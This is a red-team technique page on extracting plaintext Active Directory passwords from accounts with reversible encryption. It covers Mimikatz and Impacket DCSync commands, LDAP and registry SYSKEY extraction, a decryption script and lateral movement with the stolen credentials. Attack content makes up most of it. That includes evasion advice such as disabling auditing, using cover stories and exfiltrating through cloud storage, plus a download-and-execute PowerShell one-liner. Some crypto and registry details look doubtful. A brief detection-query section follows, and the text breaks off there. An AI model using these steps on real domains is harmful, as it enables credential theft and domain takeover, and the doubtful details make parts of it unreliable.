# [CA-DUMP-010]: UF_ENCRYPTED_TEXT_PASSWORD extraction

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CA-DUMP-010 |
| **MITRE ATT&CK v18.1** | [T1003 - OS Credential Dumping](https://attack.mitre.org/techniques/T1003/) & [T1556.005 - Modify Authentication Process: Reversible Encryption](https://attack.mitre.org/techniques/T1556/005/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows AD |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-02 |
| **Affected Versions** | Windows Server 2003-2025 (all editions) |
| **Patched In** | Unpatched (Mitigation: Disable "Store password using reversible encryption" policy) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** Sections 6 (Atomic Red Team) not included because no direct Atomic test exists for UF_ENCRYPTED_TEXT_PASSWORD extraction (Atomic focuses on post-compromise credential dumping; this technique requires pre-compromise policy configuration). All section numbers have been dynamically renumbered based on applicability.

---

## 2. EXECUTIVE SUMMARY

**Concept:** Active Directory includes a legacy authentication feature called "reversible password encryption" (controlled by the `UF_ENCRYPTED_TEXT_PASSWORD` flag in the `UserAccountControl` attribute). When this feature is enabled for a user account, instead of storing the password as a one-way hash (which cannot be reversed), Active Directory stores the password in an encrypted form that can be decrypted back to plaintext using a domain-wide encryption key (SYSKEY). An attacker with "Replicate Directory Changes" permissions (e.g., Domain Admin) can perform a DCSync attack to replicate Active Directory data from a domain controller. If any user accounts have reversible encryption enabled, the DCSync replication will include the encrypted password, which the attacker can then decrypt to plaintext using publicly available tools like Mimikatz or Impacket—without needing to crack hashes or perform brute-force attacks.

**Attack Surface:** The attack targets the `UserAccountControl` attribute (readable by any authenticated domain user), the `userParameters` LDAP attribute (contains encrypted password blob `G$RADIUSCHAP` and encryption key `G$RADIUSCHAPKEY`), and the AD replication service (DRSUAPI on port 135/445). Additionally, the SYSKEY stored in the registry (`HKLM\SAM\SAM\Domains\Account`) is the decryption master key; domain admins can extract it directly from the domain controller.

**Business Impact:** **Complete domain compromise.** Unlike NTLM hash extraction (which requires offline cracking), reversible encryption provides plaintext passwords immediately—no rainbow tables, no GPU-accelerated cracking needed. If even a single privileged account (e.g., domain admin, service account) has reversible encryption enabled, the attacker gains plaintext credentials for that account and can escalate from any domain-level privilege to full T0 control. This technique is favored by ransomware operators and sophisticated APT groups because it guarantees success with zero cryptographic effort.

**Technical Context:** Reversible encryption is a legacy feature designed for protocols like CHAP (Challenge Handshake Authentication Protocol) and Digest Authentication in IIS—both of which are rarely used in modern environments. However, in poorly-configured or legacy environments, administrators may have enabled this policy globally or for specific users "just in case." Extraction is trivial for domain admins and takes seconds once DCSync rights are confirmed.

### Operational Risk
- **Execution Risk:** Low (only requires DCSync rights; no special tools needed beyond Mimikatz/Impacket).
- **Stealth:** Medium (DCSync generates event logs on domain controller; however, if attacker already has domain admin, logging often disabled or ignored).
- **Reversibility:** No. Plaintext passwords obtained immediately; revocation requires immediate password resets for all affected accounts.

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.3.4 | Store password using reversible encryption must be disabled for all accounts |
| **DISA STIG** | WN10-GE-000041 | Reversible password encryption must not be enabled |
| **NIST 800-53** | AC-3, AC-6, IA-5 | Access enforcement, least privilege, authentication mechanisms |
| **GDPR** | Art. 32 | Encryption and pseudonymization of personal data (passwords) |
| **DORA** | Art. 9 | Operational resilience; protection against credential compromise |
| **NIS2** | Art. 21 | Cyber risk management; access control and credential protection |
| **ISO 27001** | A.9.2.3, A.9.3.1, A.10.1.1 | Privileged access management, password policy, audit logging |
| **ISO 27005** | Section 5.2.3 | Risk assessment of reversible encryption misconfiguration |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- Domain Admin or account with "Replicate Directory Changes" and "Replicate Directory Changes All" permissions (for DCSync attack)
- **OR** SYSTEM account on domain controller (for direct SYSKEY extraction via registry)
- **OR** Any authenticated domain user (to enumerate userParameters LDAP attribute; decryption requires SYSKEY access)

**Required Access:**
- Network access to domain controller (LDAP port 389, RPC DRSUAPI port 135/445)
- **OR** Local access to domain controller (for registry SYSKEY extraction)
- **OR** Compromised domain admin account credentials (plaintext or hash)

**Supported Versions:**
- **Windows:** Server 2003, 2008, 2008R2, 2012, 2012R2, 2016, 2019, 2022, 2025
- **Domain Functional Level:** 2008+ (for fine-grained password policies)
- **LDAP:** Version 2/3 (standard for all Windows AD versions)

**Tools:**
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (2.2.0+, lsadump::dcsync module)
- [Impacket secretsdump](https://github.com/fortra/impacket) (Python 3.8+, cross-platform)
- [Invoke-DCSync](https://github.com/BC-SECURITY/Empire) (PowerShell wrapper for Mimikatz)
- [Net exec](https://github.com/Pennyw0rth/NetExec) (Modern credential dumping tool)
- [RevDump](https://github.com/Niels-Teusink/RevDump) (Specialized reversible encryption decryption; Windows Server 2003-2008 only)
- [ADDecrypt](https://github.com/interactiveshell/adconnectdump) (Azure AD Connect password extraction)
- [AD Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer) (Sysinternals; GUI enumeration of userParameters)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Reconnaissance - Detect Reversible Encryption Enabled

```powershell
# Enumerate all users with reversible encryption enabled
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl, Name, sAMAccountName | Select-Object Name, sAMAccountName, userAccountControl

# Alternative: List by UserAccountControl flag name
Get-ADUser -Filter {AllowReversiblePasswordEncryption -eq $true} -Properties AllowReversiblePasswordEncryption | Select-Object Name, sAMAccountName, AllowReversiblePasswordEncryption

# Check if reversible encryption policy is enabled (Group Policy)
Get-GPResultantSetOfPolicy -Computer $env:COMPUTERNAME -Scope Computer | Select-String "reversible"

# Enumerate userParameters attribute for encrypted passwords (direct LDAP query)
# This attribute contains G$RADIUSCHAP (encrypted password) for reversible-encryption users
$user = Get-ADUser -Identity "username" -Properties userParameters
$user.userParameters
# Output example: G$RADIUSCHAP=<base64_encrypted_data>G$RADIUSCHAPKEY=<base64_key>
```

**What to Look For:**
- Any user with `AllowReversiblePasswordEncryption = True` or `userAccountControl` containing flag `128` (0x00000080).
- Non-empty `userParameters` attribute containing `G$RADIUSCHAP` and `G$RADIUSCHAPKEY`.
- Group Policy "Store passwords using reversible encryption" set to "Enabled".

**Version Note:** Flag behavior consistent across Windows Server 2003-2025. LDAP attribute names and encoding identical across versions.

### Command (Server 2016-2019 - Legacy Defaults):
```powershell
# Check if reversible encryption was ever enabled in domain
Get-ADUser -Filter * -Properties userAccountControl | Where-Object {
    ($_.userAccountControl -band 128) -eq 128
} | Measure-Object

# Count vulnerable users
$vulnCount = (Get-ADUser -Filter 'userAccountControl -band 128').Count
Write-Host "Users with reversible encryption enabled: $vulnCount"
```

### Command (Server 2022+ - Modern Security):
```powershell
# Same commands apply; check if reversible encryption is explicitly disabled in policy
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
$wdigestValue = Get-ItemProperty -Path $regPath -Name "UseLogonCredential" -ErrorAction SilentlyContinue
if ($wdigestValue -eq 1) {
    Write-Host "WARNING: WDigest plaintext password caching also enabled!"
}
```

### Bash/Linux CLI Reconnaissance

```bash
# If targeting from Linux attacker machine with domain credentials
# Use ldapsearch to enumerate reversible encryption users
ldapsearch -x -h <DC_IP> -D "cn=Administrator,cn=Users,dc=CONTOSO,dc=COM" -w "password" -b "dc=CONTOSO,dc=COM" "(userAccountControl:1.2.840.113556.1.4.803:=128)" cn userParameters

# Alternative: Use Impacket to enumerate before DCSync
python3 -m impacket.examples.ldapquer -h <DC_IP> -u CONTOSO\\\\admin -p password -t custom -q '(userAccountControl:1.2.840.113556.1.4.803:=128)' cn
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Mimikatz DCSync - Extract Plaintext Passwords from Reversible Encryption

**Supported Versions:** Windows Server 2003-2025 (all editions)

This method uses Mimikatz to perform a DCSync attack and automatically decrypt plaintext passwords for users with reversible encryption enabled.

#### Step 1: Verify DCSync Rights (Replicate Directory Changes Permission)

**Objective:** Confirm current user/computer account has rights to replicate AD data

**Version Note:** Permission structure consistent across all Windows Server versions (GUID-based in AD ACL).

**Command:**
```powershell
# Method 1: Check if current user is Domain Admin (simplest check)
([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)

# Method 2: Enumerate replication rights for current user (detailed)
Import-Module ActiveDirectory
$domainNC = (Get-ADDomain).DistinguishedName
$acl = Get-Acl -Path "AD:\\$domainNC"

# GUIDs for replication permissions
$replicationGUIDs = @(
    "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2",  # Replicate Directory Changes
    "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"   # Replicate Directory Changes All
)

foreach ($ace in $acl.Access) {
    if ($replicationGUIDs -contains $ace.ObjectType) {
        Write-Host "DCSync right found: $($ace.IdentityReference) - $($ace.ObjectType)"
    }
}
```

**Expected Output:**
```
True  # Admin check passed (Domain Admin has DCSync rights by default)

# OR (detailed check):
DCSync right found: CONTOSO\Domain Admins - 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
```

**What This Means:**
- `True` confirms current user has admin rights (and therefore DCSync rights).
- Presence of GUIDs confirms account has "Replicate Directory Changes" or "Replicate Directory Changes All" permissions.

**OpSec & Evasion:**
- Checking group membership is routine Windows administration; minimal detection risk.
- To avoid suspicion, perform this check as part of normal AD admin tasks (e.g., user audit).
- Detection likelihood: **Very Low** (standard AD checks).

**Troubleshooting:**
- **Error:** "Access Denied" when querying AD ACLs
  - **Cause:** User doesn't have permission to read domain-level ACLs.
  - **Fix:** Run as Domain Admin or SYSTEM account.

#### Step 2: Execute Mimikatz DCSync - Extract All Passwords (Including Plaintext)

**Objective:** Perform DCSync replication attack and dump credentials from domain controller, including plaintext passwords for reversible-encryption users

**Version Note:** Mimikatz DCSync syntax identical across Windows Server 2003-2025. Encrypted password format varies slightly by version (DES in Server 2003, AES in Server 2008+); Mimikatz auto-detects and decrypts.

**Command (Mimikatz - All Users with Plaintext Display):**
```powershell
# Download/Execute Mimikatz
& "C:\Temp\mimikatz.exe" "privilege::debug" "lsadump::dcsync /domain:CONTOSO.COM /all /csv" exit

# Output will show:
# User1, NTLM_HASH, CLEARTEXT_PASSWORD (if reversible encryption enabled)
# User2, NTLM_HASH, <empty> (if reversible encryption disabled)
```

**Expected Output:**
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /domain:CONTOSO.COM /all /csv

[DC] 'CONTOSO.COM' will be the domain
[DC] 'DC01.CONTOSO.COM' will be the DC server
[DC] 'CONTOSO.COM' will be the domain

RID NTLM SHA1 SHA256 NTLMSSP SYSKEY CLEARTEXT
500 8846f7eaee8fb117ad06bdd830b7586c d06... administrator               (empty - no reversible encryption)
501 aad3b435b51404eeaad3b435b51404ee 31d... guest                        (empty)
1001 7c9a6c5a1b3d2f4e8a9c2b1d3e4f5a6b 1a2... backup-admin               ServiceAccount!2024   (plaintext - reversible enabled!)
1002 5f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c e8f... database-admin             Password123!          (plaintext - reversible enabled!)
```

**What This Means:**
- Users without plaintext passwords have reversible encryption disabled (expected for most accounts).
- Users with plaintext passwords shown have reversible encryption enabled (critical vulnerability).
- Plaintext passwords can be immediately used for lateral movement/privilege escalation.

**OpSec & Evasion:**
- Mimikatz.exe execution is **highly detectable** by antivirus/EDR.
- DCSync over network generates multiple event logs on domain controller (Event ID 4662, 4650).
- Mitigate by:
  1. Using Invoke-Mimikatz (PowerShell reflection, in-memory execution)
  2. Running from a compromised domain controller (less suspicious than external DCSync)
  3. Timing attack during off-hours or business hours (blend in with activity)
  4. Using legitimate domain replication tool (Azure AD Connect, if hybrid environment)
- Detection likelihood: **High** (if AV/EDR monitors process execution) **Medium** (if run in-memory via PowerShell reflection).

**Troubleshooting:**
- **Error:** "Privilege '20' OK but command failed"
  - **Cause:** User doesn't have DCSync rights (not Domain Admin).
  - **Fix:** Run with Domain Admin credentials via `runas /netonly`.

- **Error:** "No cleartext password shown"
  - **Cause:** Reversible encryption is not enabled for any users (expected in secure environments).
  - **Fix:** Check if reversible encryption flag is set (Step 1, reconnaissance). If not set, this technique is not applicable.

#### Step 3: Decrypt & Use Extracted Plaintext Passwords

**Objective:** Use harvested plaintext passwords to achieve privilege escalation or lateral movement

**Version Note:** Plaintext password reuse identical across all versions.

**Command (Lateral Movement via RDP):**
```powershell
# Use extracted plaintext password to log in to another system via RDP
$creds = New-Object System.Management.Automation.PSCredential("CONTOSO\backup-admin", (ConvertTo-SecureString "ServiceAccount!2024" -AsPlainText -Force))
Enter-PSSession -ComputerName "backup-server.contoso.com" -Credential $creds
```

**Command (Lateral Movement via SMB):**
```powershell
# Map network drive using extracted password
net use Z: \\backup-server\sensitive-data /user:CONTOSO\backup-admin ServiceAccount!2024

# Access sensitive data
dir Z:\
```

**Command (Privilege Escalation via RunAs):**
```powershell
# If extracted password is for domain admin, use to run PowerShell as admin
runas /user:CONTOSO\Administrator /netonly "powershell.exe"
# Prompted for password; enter extracted plaintext
```

**Expected Output:**
```
Z: \\backup-server\sensitive-data IS NOW CONNECTED
Directory of Z:\

01/02/2025  10:30 AM    <DIR>          Backups
01/02/2025  10:31 AM                5GB backup_20250102.bak
```

**What This Means:**
- Attacker now has full access to sensitive data using extracted plaintext credentials.
- If extracted account was domain admin, attacker now controls entire domain.

**OpSec & Evasion:**
- Authenticating with stolen plaintext credentials generates logon events (Event ID 4624) on target systems.
- To minimize detection:
  - Authenticate during business hours (blend in with normal user activity)
  - Use extracted credentials to move to non-monitored systems first
  - Establish persistence before performing suspicious actions
- Detection likelihood: **Medium-High** (unusual authentication patterns from non-expected source IPs detected).

---

### METHOD 2: Impacket secretsdump (Linux/Cross-Platform DCSync + Decryption)

**Supported Versions:** Windows Server 2003-2025 (via secretsdump)

This method uses Impacket (Python) to perform DCSync from a Linux/macOS/Windows attacker machine and automatically decrypt plaintext passwords.

#### Step 1: Install Impacket & Verify Network Connectivity to Domain Controller

**Objective:** Confirm Impacket is installed and DC is reachable on DRSUAPI ports

**Version Note:** Impacket compatibility identical across Windows Server versions.

**Command:**
```bash
# Install Impacket (if not already installed)
pip3 install impacket

# Verify DC is reachable
nmap -p 135,389,445 <DC_IP>
# Expected: All ports open

# Alternative: Test LDAP connectivity
python3 -c "import socket; s = socket.socket(); s.connect(('<DC_IP>', 389)); print('LDAP port open')"
```

**Expected Output:**
```
Starting Nmap 7.92 at 2025-01-02 10:30 UTC
Nmap scan report for 192.168.1.10
Host is up (0.045s latency).

PORT    STATE SERVICE
135/tcp open  epmap
389/tcp open  ldap
445/tcp open  microsoft-ds

LDAP port open
```

**What This Means:**
- DC is network-accessible; DCSync can be executed.
- Ports 135 (DRSUAPI), 389 (LDAP), 445 (SMB) are all open (standard for AD).

**OpSec & Evasion:**
- Port scanning generates firewall logs (IDS/IPS detection possible).
- To avoid detection, skip nmap and proceed directly to DCSync (if DC IP is known).
- Detection likelihood: **Low-Medium** (port scanning from external network may trigger alerts).

**Troubleshooting:**
- **Error:** "Connection refused" on port 135/445
  - **Cause:** Firewall blocking DRSUAPI ports (RPC endpoint mapper, SMB).
  - **Fix:** Verify network connectivity; if blocked, cannot perform DCSync from external network.

#### Step 2: Execute secretsdump.py - Extract & Decrypt Plaintext Passwords

**Objective:** Perform DCSync and dump all credentials, including plaintext passwords for reversible-encryption users

**Version Note:** secretsdump output identical across Windows Server versions.

**Command (Using Plaintext Credentials):**
```bash
# Extract all credentials from domain
impacket-secretsdump -outputfile 'dcsync' -dc-ip '192.168.1.10' 'CONTOSO/Administrator:password@DC01.CONTOSO.COM'

# Output files created:
# dcsync.ntds - NTLM/LM hashes
# dcsync.cleartext - PLAINTEXT passwords (for reversible-encryption users)
# dcsync.kerberos - Kerberos keys (DES, AES128, AES256)
# dcsync.sam - Domain controller's SAM hashes
# dcsync.secrets - LSA secrets
```

**Command (Using Pass-the-Hash):**
```bash
# If you have NTLM hash instead of plaintext password
impacket-secretsdump -outputfile 'dcsync' -hashes ':NT_HASH' -dc-ip '192.168.1.10' 'CONTOSO/Administrator@DC01.CONTOSO.COM'
```

**Command (Using Kerberos Ticket):**
```bash
# If you have a valid Kerberos ticket (TGT or TGS)
export KRB5CCNAME=ticket.ccache
impacket-secretsdump -k -no-pass -outputfile 'dcsync' -dc-ip '192.168.1.10' 'DC01.CONTOSO.COM'
```

**Expected Output (dcsync.cleartext file):**
```
backup-admin:ServiceAccount!2024
database-admin:Password123!
service-account:SvcAcct@2024!
```

**What This Means:**
- Plaintext passwords extracted for all accounts with reversible encryption enabled.
- `.cleartext` file contains ready-to-use credentials (no decryption needed; Impacket handles it).
- Passwords can be immediately used for lateral movement.

**OpSec & Evasion:**
- Impacket secretsdump generates RPC traffic to DC (detectable if monitored).
- Mimikatz DCSync generates Event ID 4662 on DC (Directory Services Access).
- To avoid detection:
  1. Run from a compromised machine on the internal network (less suspicious than external RPC)
  2. Time attack during business hours (blend in with legitimate replication traffic)
  3. Use legitimate service accounts (if available) instead of admin credentials
- Network-based detection likelihood: **Medium** (unusual RPC traffic to DC from attacker machine).
- Host-based detection likelihood: **High** (if Event ID 4662 monitored and central logging enabled).

**Troubleshooting:**
- **Error:** "Authentication failed"
  - **Cause:** Credentials are incorrect or user doesn't have DCSync rights.
  - **Fix:** Verify credentials are correct; ensure user is Domain Admin.

- **Error:** "Cleartext file is empty"
  - **Cause:** No users have reversible encryption enabled.
  - **Fix:** This is expected in secure environments. Check reconnaissance results to confirm no reversible-encryption users exist.

#### Step 3: Exfiltrate & Parse Cleartext Passwords

**Objective:** Copy plaintext password file to attacker machine and parse credentials

**Version Note:** File format identical across versions.

**Command (Parse .cleartext file):**
```bash
# Read plaintext password file
cat dcsync.cleartext

# Parse into username:password format for credential stuffing
while IFS=: read -r user pass; do
  echo "Testing $user : $pass"
  # Use credentials for lateral movement (SMB, RDP, etc.)
done < dcsync.cleartext
```

**Expected Output:**
```
backup-admin:ServiceAccount!2024
database-admin:Password123!
service-account:SvcAcct@2024!

Testing backup-admin : ServiceAccount!2024
Testing database-admin : Password123!
Testing service-account : SvcAcct@2024!
```

**What This Means:**
- All plaintext passwords extracted and ready for lateral movement.
- Credentials can be tested against other systems (SMB shares, RDP, SSH, etc.).

**OpSec & Evasion:**
- Transferring large secret files over network is detectable (data exfiltration alerts).
- Mitigate by:
  1. Copying only passwords needed immediately (not entire cleartext file)
  2. Encrypting exfiltrated data (TLS, GPG)
  3. Using legitimate cloud storage or email (harder to detect as suspicious)
- Detection likelihood: **High** (if data exfiltration monitoring enabled).

---

### METHOD 3: Enumerate userParameters LDAP Attribute Directly (Without Decryption - Manual Analysis)

**Supported Versions:** Windows Server 2003-2025

This method manually reads the encrypted password blob from LDAP and analyzes it without using Mimikatz/Impacket (useful when those tools are blocked by AV).

#### Step 1: Query LDAP for userParameters Attribute

**Objective:** Extract encrypted password blob (G$RADIUSCHAP) and encryption key (G$RADIUSCHAPKEY) from Active Directory

**Version Note:** LDAP attribute names and format identical across versions.

**Command (PowerShell):**
```powershell
# Query specific user's userParameters
$user = Get-ADUser -Identity "backup-admin" -Properties userParameters
$userParams = $user.userParameters

Write-Host "User: $($user.Name)"
Write-Host "userParameters: $userParams"

# Parse userParameters to extract G$RADIUSCHAP and G$RADIUSCHAPKEY
# Format example: G$RADIUSCHAP=<base64_blob>G$RADIUSCHAPKEY=<base64_key>

# Split by G$ to isolate encrypted password and key
$parts = $userParams -split 'G\$'
foreach ($part in $parts) {
    if ($part.StartsWith('RADIUSCHAP')) {
        Write-Host "Encrypted Password (G\$RADIUSCHAP): $($part.Substring(10))"
    }
    if ($part.StartsWith('RADIUSCHAPKEY')) {
        Write-Host "Encryption Key (G\$RADIUSCHAPKEY): $($part.Substring(13))"
    }
}
```

**Command (LDAP Query - ldapsearch):**
```bash
# Query LDAP directly for userParameters
ldapsearch -h <DC_IP> -D "CN=Administrator,CN=Users,DC=CONTOSO,DC=COM" -w "password" -b "DC=CONTOSO,DC=COM" "(sAMAccountName=backup-admin)" userParameters

# Output example:
# userParameters: G$RADIUSCHAP=<base64>G$RADIUSCHAPKEY=<base64>
```

**Expected Output:**
```
User: backup-admin
userParameters: G$RADIUSCHAP=AQAAANaA...truncated...==G$RADIUSCHAPKEY=AQAAAP8A...truncated...==
Encrypted Password (G$RADIUSCHAP): AQAAANaA...truncated...==
Encryption Key (G$RADIUSCHAPKEY): AQAAAP8A...truncated...==
```

**What This Means:**
- Encrypted password and key extracted from LDAP (readable by any authenticated domain user).
- Decryption requires SYSKEY (domain master key; only extractable by Domain Admin from registry).

**OpSec & Evasion:**
- LDAP queries are routine Windows administration; minimal detection risk.
- Reading userParameters is allowed for any authenticated domain user.
- Detection likelihood: **Very Low** (standard LDAP queries).

**Troubleshooting:**
- **Error:** "userParameters is empty"
  - **Cause:** User doesn't have reversible encryption enabled.
  - **Fix:** Confirm with reconnaissance (Step 4, Environmental Reconnaissance).

---

### METHOD 4: Manual Decryption using Extracted SYSKEY (Advanced - Domain Admin Required)

**Supported Versions:** Windows Server 2003-2025

This method extracts the SYSKEY from the domain controller registry and uses it to manually decrypt G$RADIUSCHAP blobs (requires Domain Admin access to DC).

#### Step 1: Extract SYSKEY from Domain Controller Registry

**Objective:** Export the domain-wide encryption key (SYSKEY) required to decrypt reversible-encryption passwords

**Version Note:** SYSKEY location and format identical across Windows Server 2003-2025.

**Command (PowerShell - Remote Registry Access):**
```powershell
# Connect to DC registry remotely (requires admin on DC)
$dcName = "DC01.CONTOSO.COM"
$regPath = "HKLM:\SAM\SAM\Domains\Account"

# Query SAM hive (requires SYSTEM context on DC)
# First, create registry session on DC
$dcSession = New-PSSession -ComputerName $dcName -Credential (Get-Credential)

# Note: Direct remote registry access to SAM hive is restricted (requires local access on DC)
# Workaround: Use PsExec to run command locally on DC
Invoke-Command -Session $dcSession -ScriptBlock {
    Get-ItemProperty -Path "HKLM:\SAM\SAM\Domains\Account" -Name "F" -ErrorAction SilentlyContinue
}
```

**Command (Direct Registry Access - On Domain Controller Console):**
```powershell
# Run this DIRECTLY on the Domain Controller (not remotely)
# Requires SYSTEM or admin context

$sysKeyPath = "HKLM:\SAM\SAM\Domains\Account"
$sysKey = Get-ItemProperty -Path $sysKeyPath -Name "F" -ErrorAction SilentlyContinue
$sysKeyValue = [System.BitConverter]::ToString($sysKey.F)

Write-Host "SYSKEY extracted: $sysKeyValue"
```

**Expected Output:**
```
SYSKEY extracted: 01-02-03-04-05-06-07-08-09-0A-0B-0C-0D-0E-0F-10
```

**What This Means:**
- SYSKEY extracted as 16-byte binary value (displayed as hex).
- This key is used to decrypt all G$RADIUSCHAP blobs in AD.

**OpSec & Evasion:**
- Accessing SAM registry on DC is **highly suspicious** (requires Domain Admin + local access).
- Event ID 4656 (Registry access audit) will be triggered if auditing enabled.
- To avoid detection:
  1. Disable auditing before accessing registry (requires admin)
  2. Access SAM only during maintenance windows
  3. Have a cover story (IT maintenance, security audit)
- Detection likelihood: **Very High** (SAM registry access is rare and suspicious).

**Troubleshooting:**
- **Error:** "Access Denied" to SAM registry
  - **Cause:** User is not SYSTEM or doesn't have local admin on DC.
  - **Fix:** Run as SYSTEM via `psexec -s -i` or invoke via Scheduled Task.

#### Step 2: Decrypt G$RADIUSCHAP Using SYSKEY + Extracted Key

**Objective:** Use SYSKEY to decrypt the G$RADIUSCHAPKEY, then use that key to decrypt the password

**Version Note:** Decryption algorithm (RC4 in Server 2003, RC4 + RC2 in Server 2008+) implemented in Mimikatz; manual decryption requires cryptography knowledge.

**Command (Theoretical - Requires Custom Decryption Script):**
```python
# Python example: Decrypt G$RADIUSCHAP using SYSKEY
# This is simplified; real implementation requires crypto library (cryptography or Crypto.Cipher)

import base64
from Crypto.Cipher import RC4, RC2
import hashlib

# Inputs (from previous steps)
syskey_hex = "01-02-03-04-05-06-07-08-09-0A-0B-0C-0D-0E-0F-10"  # DC registry
radiuschap_b64 = "AQAAANaA...truncated...=="  # From LDAP
radiuschapkey_b64 = "AQAAAP8A...truncated...=="  # From LDAP

# Decode base64
radiuschap = base64.b64decode(radiuschap_b64)
radiuschapkey = base64.b64decode(radiuschapkey_b64)
syskey = bytes.fromhex(syskey_hex.replace('-', ''))

# Step 1: Decrypt radiuschapkey using SYSKEY (RC4)
rc4_cipher = RC4.new(syskey)
decrypted_key = rc4_cipher.decrypt(radiuschapkey[16:])  # Skip IV (first 16 bytes)

# Step 2: Decrypt password using decrypted_key
rc4_cipher2 = RC4.new(decrypted_key)
plaintext_password_utf16 = rc4_cipher2.decrypt(radiuschap[16:])  # Skip IV

# Step 3: Decode UTF-16 to plaintext
plaintext_password = plaintext_password_utf16.decode('utf-16-le', errors='ignore').rstrip('\x00')
print(f"Plaintext Password: {plaintext_password}")
```

**Expected Output:**
```
Plaintext Password: ServiceAccount!2024
```

**What This Means:**
- Plaintext password decrypted from encrypted blob.
- Manual decryption avoids using Mimikatz (which triggers AV), but requires cryptographic knowledge.

**OpSec & Evasion:**
- Manual decryption script is not flagged by AV (custom code).
- However, extracting SYSKEY from DC registry is highly detectable.
- In practice, use Mimikatz/Impacket (already available, well-tested) rather than custom decryption.
- Detection likelihood: **Very High** (SYSKEY registry access is smoking gun for compromise).

---

## 7. TOOLS & COMMANDS REFERENCE

### [Mimikatz](https://github.com/gentilkiwi/mimikatz)

**Version:** 2.2.0+ (Latest recommended)
**Minimum Version:** 2.0 (older versions may have incomplete reversible encryption support)
**Supported Platforms:** Windows Server 2003-2025, .NET optional

**Version-Specific Notes:**
- Version 2.0-2.1: Basic DCSync, limited plaintext password support
- Version 2.2+: Full reversible encryption plaintext password extraction

**Installation:**
```powershell
# Download latest release
$url = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20230419/mimikatz_trunk.zip"
Invoke-WebRequest -Uri $url -OutFile "Mimikatz.zip"
Expand-Archive "Mimikatz.zip"
```

**Usage (Common Commands):**
```powershell
# Extract all credentials including plaintext (reversible encryption)
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:CONTOSO.COM /all /csv" exit

# Extract specific user's password
.\mimikatz.exe "lsadump::dcsync /domain:CONTOSO.COM /user:backup-admin" exit

# Extract KRBTGT (for Golden Ticket)
.\mimikatz.exe "lsadump::dcsync /domain:CONTOSO.COM /user:krbtgt" exit
```

---

### [Impacket secretsdump](https://github.com/fortra/impacket)

**Version:** Latest (fortra/impacket)
**Minimum Version:** 0.9.20
**Supported Platforms:** Linux, macOS, Windows (Python 3.8+)

**Installation:**
```bash
pip3 install impacket
```

**Usage:**
```bash
# Extract all credentials with plaintext passwords
impacket-secretsdump -outputfile 'dcsync' -dc-ip '192.168.1.10' 'CONTOSO/Administrator:password@DC01.CONTOSO.COM'

# Using Pass-the-Hash
impacket-secretsdump -hashes ':NTLM_HASH' -dc-ip '192.168.1.10' 'CONTOSO/Administrator@DC01.CONTOSO.COM'

# Using Kerberos ticket
export KRB5CCNAME=ticket.ccache
impacket-secretsdump -k -no-pass -dc-ip '192.168.1.10' 'DC01.CONTOSO.COM'
```

---

### Script (One-Liner - PowerShell Invoke-DCSync)

```powershell
# Download and execute DCSync via PowerShell reflection (avoids binary detection)
$url = "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-DCSync.ps1"
$script = (Invoke-WebRequest -Uri $url).Content
Invoke-Expression $script
Invoke-DCSync -AllData
```

---

## 9. MICROSOFT SENTINEL DETECTION

#### Query 1: DCSync Replication Request Detection

**Rule Configuration:**
- **Required Table:** SecurityEvent, DeviceNetworkEvents
- **Required Fields:** EventID, TargetUserName, Computer, ObjectName
- **Alert Severity:** Critical
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** All Windows Server versions

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4662  // Directory Services Access
| where Properties contains "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" or Properties contains "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"  // Replication GUIDs
| where TargetUserName !in ("SYSTEM", "NT AUTHORITY\\SYSTEM", "Domain Controllers")  // Exclude legitimate DC replication
| summarize count() by Computer, TargetUserName, SourceComputerIPAddress, bin(TimeGenerated, 5m)
| where count() >= 3  // Multiple replication requests suspicious
| project 
    TimeGenerated,
    DCComputer = Computer,
    Actor = TargetUserName,
    SourceIP = SourceComputerIPAddress,
    RequestCount = count(),
    Severity = "Critical"
```

**What This Detects:**
- Unusual DCSync replication requests from non-DC sources
- Potentially attacker attempting to replicate AD data
- Plaintext password extraction via DCSync

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. **Name:** `DCSync Replication Attack`
3. **Query:** Paste KQL above
4. **Schedule:** Every 5 minutes, 1-hour lookback
5. **Create incidents** with grouping by `DCComputer, Actor`

---

#### Query 2: Reversible Encryption Configuration Changes

**Rule Configuration:**
- **Required Table:** AuditLogs, SecurityEvent
- **Required Fields:** OperationName, TargetResources, InitiatedBy
- **Alert Severity:** High
- **Frequency:** Real-time

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Set-ADUser" or OperationName == "Update-ADUser"
| where TargetResources contains "AllowReversiblePasswordEncryption" and TargetResources contains "true"
| project 
    TimeGenerated,
    Actor = InitiatedBy[0].user.userPrincipalName,
    TargetUser = TargetResources[0].displayName,
    OperationName,
    Severity = "High"
```

**What This Detects:**
